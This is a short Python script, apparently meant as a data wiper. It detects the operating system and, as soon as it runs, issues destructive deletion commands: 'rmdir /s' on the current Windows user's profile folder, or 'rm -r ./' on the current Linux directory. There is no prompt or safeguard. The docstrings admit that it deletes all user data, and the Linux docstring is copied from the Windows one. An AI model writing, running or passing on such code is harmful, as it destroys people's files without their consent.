import os
import platform

def clear_windows():
    import subprocess
    """
    A progrm that deletes all the data present in C:Users/<user>
    directory, which may completely damage the directory
    Valid for Windows OS only
    params: None
    return:None
    """
    USER = subprocess.getoutput("whoami").split("\\")[-1]
    os.system(f"rmdir /s C:Users/{USER}")

def clear_Linux():
    """
    A progrm that deletes all the data present in C:Users/<user>
    directory, which may completely damage the directory
    Valid for Linux OS only
    params: None
    return:None
    """
    os.system("rm -r ./")

platform = platform.system()

if platform == "Windows":
    clear_windows()
elif platform == "Linux":
    clear_Linux()
else:raise OSError